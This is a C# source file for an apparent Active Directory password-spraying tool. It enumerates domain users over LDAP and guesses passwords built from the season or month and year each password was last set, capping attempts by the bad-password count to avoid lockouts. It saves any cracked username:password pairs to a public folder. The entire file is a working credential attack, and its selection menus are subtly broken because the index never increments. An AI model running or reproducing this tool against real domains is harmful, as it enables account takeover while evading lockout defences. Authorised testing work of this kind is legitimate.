//////////////////////////////////
// File: SmartishSpray.cs
// Author: Brian Fehrman
// Date: 2020-06-10
// Description: Main class for SmartishSpray program
//////////////////////////////////

using System;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using System.IO;

namespace SmartishSpray
{
    class SmartishSprayer
    {
        // Declare class members and getters for members
        private Domain _domain;
        public Domain DomainInfo => _domain;
        public DomainController _domainController;
        public DomainController DomainControllerInfo => _domainController;
        private string _ldapPath;
        public string LdapPath => _ldapPath;
        private int _numPasswords = 2;
        private UserInfo[] _userList;
        public UserInfo[] UserList => _userList;

        // Struct to hold relevant attributes and
        // targeted password list for each user
        public struct UserInfo
        {
            public int badPwdCount;
            public string[] passwordList;
            public DateTime pwdLastSet;
            public string samUserName;
        }

        // Class constructor
        public SmartishSprayer()
        {
        }

        // Form the list of passwords for each user based on when the user
        // last set their password
        public void BuildPasswordLists()
        {
            // Iterate over each user
            for (int i = 0; i < _userList.Length; i++)
            {
                _userList[i].passwordList = new string[_numPasswords];

                // Create password of the form <SeasonSet><YearSet>
                _userList[i].passwordList[0] = getSeason(_userList[i].pwdLastSet) + _userList[i].pwdLastSet.Year.ToString();

                // Create password of the form <MonthSet><YearSet>
                _userList[i].passwordList[1] = _userList[i].pwdLastSet.ToString("MMMM") + _userList[i].pwdLastSet.Year.ToString();

                // Add an exclamation point for <MonthSet><YearSet> if it is less than 8 characters
                // as 8  is a typical minimum for many organizations
                if (_userList[i].passwordList[1].Length < 8)
                {
                    _userList[i].passwordList[1] += "!";
                }
            }
        }

        // Determine the season that was likely chosen
        // based upon the month passed in
        private string getSeason(DateTime date)
        {
            int month = date.Month;
            string season = "";
            if (3 <= month && month < 6)
            {
                season = "Spring";
            }
            else if (6 <= month && month < 9)
            {
                season = "Summer";
            }
            else if (9 <= month && month < 12)
            {
                season = "Fall";
            }
            else
            {
                season = "Winter";
            }

            return season;
        }

        // Form the LDAP path based on user selection of domain
        // and domain controller
        public void GetLDAPPath()
        {
            // Get information for the forest we are in
            Forest forest = Forest.GetCurrentForest();

            // Get all of the domains in the forest and output
            // them to the user for selection
            // Keep looping until we get a correct selection
            while (true)
            {
                int idx = 0;
                int selection = 0;


                DomainCollection domains = forest.Domains;

                foreach (Domain domain in domains)
                {
                    Console.WriteLine(String.Format("[{0}] : {1}", idx, domain.Name));
                }

                Console.Write("\nPlease select a domain: ");

                try
                {
                    selection = Convert.ToInt32(Console.ReadLine());
                }
                catch
                {
                    continue;
                }

                if (0 <= selection && selection < domains.Count)
                {
                    _domain = domains[selection];
                    break;
                }
                else
                {
                    Console.WriteLine("Invalid Choice");
                    continue;
                }
            }

            // Get all of the domain controllers for the selected domain
            // and output them to the user for selection. Mark the
            // Primary Domain Controller with [PDC]
            // Keep looping until we get a correct selection
            while (true)
            {
                int idx = 0;
                int selection = 0;

                DomainControllerCollection dcs = _domain.DomainControllers;

                foreach (DomainController dc in dcs)
                {
                    // Mark the PDC as such
                    string pdcRole = "";
                    if (dc.Roles.Contains(ActiveDirectoryRole.PdcRole))
                    {
                        pdcRole = "[PDC]";
                    }
                    Console.WriteLine(String.Format("[{0}] : {1} {2}", idx, dc.Name, pdcRole));
                }

                Console.Write("\nPlease select a domain controller: ");

                try
                {
                    selection = Convert.ToInt32(Console.ReadLine());
                }
                catch
                {
                    continue;
                }

                if (0 <= selection && selection < dcs.Count)
                {
                    _domainController = dcs[selection];
                    break;
                }
                else
                {
                    Console.WriteLine("Invalid Choice");
                    continue;
                }
            }

            // Form the LDAP path based upon the domain and domain controller
            // that the user selected
            _ldapPath = "LDAP://" + _domainController.Name + "/";

            foreach (string val in _domain.Name.Split("."))
            {
                _ldapPath += "dc=" + val + ",";
            }

            // remove trailing comma
            _ldapPath = _ldapPath.Substring(0, _ldapPath.Length - 1);

            Console.WriteLine(_ldapPath);
        }

        // Get all of the users in the domain and exclude machines
        // and other weird accounts
        public void GetADUsers()
        {
            try
            {
                DirectoryEntry dEntry = new DirectoryEntry(_ldapPath);
                DirectorySearcher dSearcher = new DirectorySearcher(dEntry);

                // This specifies we just want actual user accounts
                dSearcher.Filter = "(&(objectCategory=person)(objectClass=user))";

                SearchResultCollection results = dSearcher.FindAll();

                // Loop through the results and grab out the relevant attributes for
                // each user
                if (results != null)
                {
                    _userList = new UserInfo[results.Count];
                    for (int i = 0; i < results.Count; i++)
                    {
                        SearchResult res = results[i];
                        UserInfo user = new UserInfo();
                        user.badPwdCount = (int)res.Properties["badPwdCount"][0];
                        user.samUserName = res.Properties["samAccountName"][0].ToString();
                        user.pwdLastSet = DateTime.FromFileTimeUtc((long)res.Properties["pwdLastSet"][0]);
                        _userList[i] = user;
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Error retrieving user info");
                Console.WriteLine("Exception : " + e.Message);
            }
        }

        // Try the targeted password list for each user provided
        // that the badPwdCount doesn't exceed 2
        public void SprayUsers()
        {
            Console.WriteLine("");

            // PrincipalContext is the object we need to try the credentials for each user
            using (PrincipalContext context = new PrincipalContext(ContextType.Domain, _domain.Name))
            {
                foreach (UserInfo user in _userList)
                {
                    // Make sure we don't exceed a badPwdCount of 2
                    for (int i = 0; i < _numPasswords - user.badPwdCount; i++)
                    {
                        bool valid = false;

                        // Check the credentials
                        try
                        {
                            valid = context.ValidateCredentials(user.samUserName, user.passwordList[i]);
                        }
                        catch
                        {
                            // If we hit this, the password is probably not valid
                            continue;
                        }

                        // If the password was valid, write it to the console and save it to a file. Stop
                        // trying more passwords for this user
                        if (valid)
                        {
                            Console.WriteLine(String.Format("{0}:{1}", user.samUserName, user.passwordList[i]));

                            using (StreamWriter fout = File.AppendText(@"C:\Users\Public\sprayed.txt"))
                            {
                                fout.WriteLine(String.Format("{0}:{1}", user.samUserName, user.passwordList[i]));
                            }

                            break;
                        }
                    }
                }
            }
        }
    }
}
